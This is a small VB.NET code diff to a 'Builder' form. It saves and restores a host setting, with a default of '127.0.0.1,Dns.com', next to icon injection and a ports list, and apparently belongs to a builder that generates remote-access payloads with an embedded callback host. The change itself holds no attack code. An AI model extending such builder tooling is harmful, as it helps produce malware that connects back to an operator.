@@ -57,7 +57,7 @@ Public Class Builder
                     If PictureBox1.ImageLocation <> Nothing Then
                         IconChanger.InjectIcon(o.FileName, PictureBox1.ImageLocation)
                     End If
-
+                    STV("HOST", TextBox1.Text)
                     MessageBox.Show(o.FileName, "Done!", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1)
                     Me.Close()
                 End With
@@ -69,6 +69,11 @@ Public Class Builder
     End Sub
 
     Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        If GTV("HOST") <> Nothing Then
+            TextBox1.Text = GTV("HOST")
+        Else
+            TextBox1.Text = "127.0.0.1,Dns.com"
+        End If
         TextBox2.Text = String.Join(",", Settings.Ports.ToList)
     End Sub
 
